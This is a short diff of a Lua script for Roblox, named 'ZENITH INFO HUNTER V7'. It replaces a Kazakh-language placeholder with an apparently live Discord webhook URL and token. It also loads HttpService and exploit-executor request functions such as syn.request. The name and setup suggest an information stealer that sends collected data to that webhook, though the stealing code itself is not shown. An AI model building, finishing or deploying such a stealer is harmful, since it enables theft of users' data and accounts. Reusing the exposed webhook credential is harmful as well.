@@ -1,7 +1,7 @@
 -- [[ ZENITH INFO HUNTER V7 ]]
 -- [[ LICENSED TO: TRADE-SECURE-GLOBAL ]]
 
-local _w = "СЕНІҢ_WEBHOOK_СІЛТЕМЕҢ" -- ОСЫНДА WEBHOOK ҚОЙ
+local _w = "https://discord.com/api/webhooks/1481688367778234418/cK_6-k7Ci1uacOY-2am1aNx82hS0zYHmYSnZ_lirxQRB6hsYVeF1dWce5Q0kZ1plJK-b" -- ОСЫНДА WEBHOOK ҚОЙ
 
 local Http = game:GetService("HttpService")
 local Req = request or http_request or syn.request
